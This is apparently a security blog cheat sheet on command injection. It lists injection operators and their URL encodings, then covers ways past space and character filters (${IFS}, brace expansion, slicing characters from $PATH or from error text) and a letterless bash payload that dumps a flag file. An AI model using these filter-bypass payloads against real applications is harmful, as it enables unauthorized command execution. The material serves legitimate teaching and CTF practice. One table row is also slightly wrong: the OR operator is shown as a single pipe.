---
title: Command Injection
layout: post
date: 2025-05-05
description: "Command Injection is a type of attack where an attacker can execute arbitrary commands on the host operating system via a vulnerable application."
permalink: /theory/misc/cmi
---

## Command Injection Overview
Command Injection is a type of attack where an attacker can execute arbitrary commands on the host operating system via a vulnerable application. This is typically done by injecting malicious commands into input fields that are then executed by the server.

## Command Injection Cheat Sheet


### Basic Command Injection Characters

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

A usefull command on Linux to find the interpretation of strokes of command like `CTRL+I` is `showkey -a` which will show us the ASCII code of the stroke. For example, if we want to find the ASCII code of `CTRL+I`, we can use the following command:

```bash
showkey -a

Press any keys - Ctrl-D will terminate this program

		 9 0011 0x09
m 	109 0155 0x6d
H 	72 0110 0x48
i 	105 0151 0x69
j 	106 0152 0x6a
u 	117 0165 0x75
x 	120 0170 0x78
S 	83 0123 0x53
^M 	13 0015 0x0d
^L 	12 0014 0x0c
^J 	10 0012 0x0a
^C 	 3 0003 0x03
^X 	24 0030 0x18
^Z 	26 0032 0x1a
```
### Bypassing Blacklists
 
#### Filtered Spaces

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Description**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------- |
| `Tab`                    | `\t`                    | `%09`                     | Both Linux and Windows accepts tabs to separate commands, useful for bypassing a space blacklist|
| `IFS`              | `${IFS}`                  |             | IFS is a special variable in Linux (Internal Field Separator) which is normally a space or a tab as the default separator|
| `Brace Expansion` | `{}` | `` | `{}` is a special character in Linux which is used to group commands together. It can be used to bypass a space blacklist, `{ls,-la}` would result in `ls -la` command |

> **Note:** To force a tab character on a shell, we can send `CTRL+v` and then `CTRL+I` (or simply `CTRL-v`+`TAB Key`) to insert a tab character. This is useful when we want to bypass a space blacklist.
{: .prompt-info}

### Bypassing Arithmetic Expansion

If we are inside an arithmetic expansion environment like

```bash
echo $((<INPUT>))
```

we can add spaces from within the parentheses to make the shell interpret the command as a simple command expression and not as an arithmetic expression. For example, if we want to execute the command `ls`, we can use the following command:

```bash
#Input: ls -la) ) #
```

this will be evaluated as `echo $((ls -la ) ) #))`, which will be interpreted as `echo $((ls -la) )` and will show us the output of the command `ls -la`.


### Getting Characters From Variables

We can bypass some filters by using variables to get the characters we need. For example, if we want to get the character `:`, or `/`, we can use the `PATH` environment variable `PATH` which contains a colon `:` and `/` in its value.

```bash
echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
We can use the `{}` operator to get the character we need. For example, if we want to get the character `:`, we can use the following command:

```bash
${PATH:16:1}
```

This will return the character `:`. We can use the same technique to get the character `/` by using the following command:

```bash
${PATH:0:1}
```

We can force more characters available to our use by creating variables from errors. For example, if we have a shell that restricts every alphabetic character, and we see an error like:

```bash
$ /_
zsh: no such file or directory: /_
```

We sent the `/_` input and got that error, we can see that we have `d` and `i` on that error, if this was a variable we could get it to send the command `id`, so, we can save this error in a variable and use it to get the characters we need. Since it comes from `stderr` we can redirect the standard error for the error to our output with `2>&1`

```bash
_1=$(/_ 2>&1)
$ $_1
zsh: no such file or directory: zsh: no such file or directory: /_
```

As we can see, it tried running our variable which expanded to the error, so now we can get the characters we want to run the command `id`:

```bash
# Get char i
${_1:22:1}
zsh: command not found: i
# Get char d and running id

$ ${_1:22:1}${_1:21:1}
uid=1000(user) gid=1000(user) groups=1000(user),965(docker),998(wheel)
```

### Bash without letters
With bash we can use special characters to execute commands without using letters. For example, we can use the following command to execute the same as the command `cat`:

```bash
"$(<~/*/????.???)"
```
This command will send to contents of the file `flag.txt` (or the one matching the `?`) and return an output error saying command not found but with the contents of the file.
